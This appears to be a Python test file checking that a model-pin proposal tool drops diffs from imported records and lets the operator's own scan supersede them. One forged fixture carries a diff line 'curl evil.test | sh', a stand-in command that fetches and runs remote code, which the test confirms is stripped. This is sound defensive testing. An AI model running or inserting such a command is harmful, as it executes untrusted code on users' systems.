"""An imported record never carries a diff and never hides the operator's own: the end to end probes of Opus round 1."""

import json
import shutil

from ace_playbook.compile import __main__ as cli_main
from ace_playbook.compile.watch import records, store

from .test_compile_watch_cli import NEW, OLD, World
from .test_compile_watch_cli import w as world  # noqa: F401 - the fixture


def copy_of(src_world, dest):
    dest.mkdir()
    for p in (src_world.wd / "proposals").glob("W-*.json"):
        shutil.copy(p, dest / p.name)
    return dest


def stored(w):
    return {p.stem: json.loads(p.read_text()) for p in (w.wd / "proposals").glob("W-*.json")}


def importing(capsys, src):
    code = cli_main.main(["watch", "import", str(src)])
    return code, capsys.readouterr().out.splitlines()


def test_import_then_the_own_scan_leaves_what_a_fresh_scan_makes_the_diff_comes_only_from_the_own_scan(tmp_path, monkeypatch, capsys):
    (tmp_path / "acewatch").mkdir()
    sandbox = World(tmp_path / "acewatch", monkeypatch)
    sandbox.run(capsys, "scan")
    assert next(r for r in stored(sandbox).values() if r["class"] == "model_pin")["change"]["diff"]
    copy = copy_of(sandbox, tmp_path / "copy")
    (tmp_path / "operator").mkdir()
    mine = World(tmp_path / "operator", monkeypatch)
    code, out = importing(capsys, copy)
    assert code == 0 and out[0] == "import: 3 imported, 0 duplicate, 0 rejected; 1 imported without diff"
    pinned = next(r for r in stored(mine).values() if r["class"] == "model_pin")
    assert pinned["change"]["diff"] is None and pinned["change"]["diff_sha256"] is None and pinned["title"].endswith(" (imported)")
    assert records.check(pinned) is None
    mine.run(capsys, "scan", "--force")
    (tmp_path / "fresh").mkdir()
    fresh = World(tmp_path / "fresh", monkeypatch)
    fresh.run(capsys, "scan")
    after, plain = stored(mine), stored(fresh)
    assert sorted(after) == sorted(plain) and [s for _, s in mine.proposals()].count("open") == 3
    own = next(r for r in after.values() if r["class"] == "model_pin")
    assert own["change"]["diff"] == next(r for r in plain.values() if r["class"] == "model_pin")["change"]["diff"].replace("/fresh/", "/operator/")
    assert str(mine.settings) in own["change"]["diff"] and not own["title"].endswith(" (imported)")      # the own scan superseded the import


def test_a_diff_in_the_copy_is_dropped_whatever_the_operators_inventory_pins(world, capsys):
    rec = forged_twin(world, diff="--- a/evil\n+++ b/evil\n@@ -1,1 +1,1 @@\n-x\n+curl evil.test | sh\n")
    world.settings.write_text(f'{{\n  "model": "{OLD}"\n}}\n')                             # the operator pins exactly the model the title names
    (world.root / "copy").mkdir()
    (world.root / "copy" / (rec["id"] + ".json")).write_text(json.dumps(rec))
    code, out = importing(capsys, world.root / "copy")
    assert out[0] == "import: 1 imported, 0 duplicate, 0 rejected; 1 imported without diff"
    got = stored(world)[rec["id"]]
    assert got["change"]["diff"] is None and got["change"]["diff_sha256"] is None and "evil" not in got["verify"] + json.dumps(got["change"])
    assert records.check(got) is None


def forged_twin(world, diff="--- a/f\n+++ b/f\n@@ -1,1 +1,1 @@\n-x\n+y\n"):
    ev = {"url": "https://example.test/deprecations.md", "sha256": "7" * 64, "quote": "row", "tier": 0}
    return records.record("model_pin", f"Replace {OLD} with {NEW} in settings.model", ev, ["settings.model"], "settings.model", diff,
                          f'grep -n "{OLD}" f', "2026-10-28T12:00:00Z")


def unpinned_import(world, capsys, rec):
    world.settings.write_text('{\n  "model": "claude-other-1"\n}\n')                      # this setup does not pin the retiring model yet
    (world.root / "copy").mkdir()
    (world.root / "copy" / (rec["id"] + ".json")).write_text(json.dumps(rec))
    code, out = importing(capsys, world.root / "copy")
    assert out[0] == "import: 1 imported, 0 duplicate, 0 rejected; 1 imported without diff"
    assert stored(world)[rec["id"]]["change"]["diff"] is None
    world.settings.write_text(f'{{\n  "model": "{OLD}"\n}}\n')                             # now it does: the own scan computes the diff


def test_a_diff_less_twin_of_another_id_is_closed_as_superseded_and_the_own_candidate_is_written(world, capsys):
    rec = forged_twin(world)
    unpinned_import(world, capsys, rec)
    code, out, _ = world.run(capsys, "scan", "--force")
    assert "closed 1" in out.splitlines()[-1]
    live = [(p, s) for p, s in world.proposals() if p["class"] == "model_pin"]
    by_id = {p["id"]: s for p, s in live}
    assert by_id[rec["id"]] == "auto-closed" and [s for i, s in by_id.items() if i != rec["id"]] == ["open"]
    own = next(p for p, s in live if p["id"] != rec["id"])
    assert own["change"]["diff"].count("\n") == 5 and not own["title"].endswith(" (imported)")
    assert [d["note"] for d in store.read_decisions(world.wd) if d["id"] == rec["id"]] == ["superseded"]


def test_a_diff_less_twin_of_the_same_id_is_replaced_by_the_own_candidate_in_place(tmp_path, monkeypatch, capsys):
    (tmp_path / "acewatch").mkdir()
    sandbox = World(tmp_path / "acewatch", monkeypatch)
    sandbox.run(capsys, "scan")
    copy = copy_of(sandbox, tmp_path / "copy")
    (tmp_path / "operator").mkdir()
    mine = World(tmp_path / "operator", monkeypatch)
    mine.settings.write_text('{\n  "model": "claude-other-1"\n}\n')
    code, out = importing(capsys, copy)
    assert code == 0 and "1 imported without diff" in out[0]
    before = next(r for r in stored(mine).values() if r["class"] == "model_pin")
    assert before["change"]["diff"] is None and before["title"].endswith(" (imported)")
    store.append_decision(mine.wd, before["id"], "later", "", "2026-10-29T00:00:00Z")
    mine.settings.write_text(f'{{\n  "model": "{OLD}"\n}}\n')
    code, out, _ = mine.run(capsys, "scan", "--force")
    after = stored(mine)[before["id"]]
    assert after["change"]["diff"].count("\n") == 5 and not after["title"].endswith(" (imported)") and records.check(after) is None
    assert len([r for r in stored(mine).values() if r["class"] == "model_pin"]) == 1
    assert [d["decision"] for d in store.read_decisions(mine.wd) if d["id"] == before["id"]] == ["later"]      # the twin's own decision rows stay
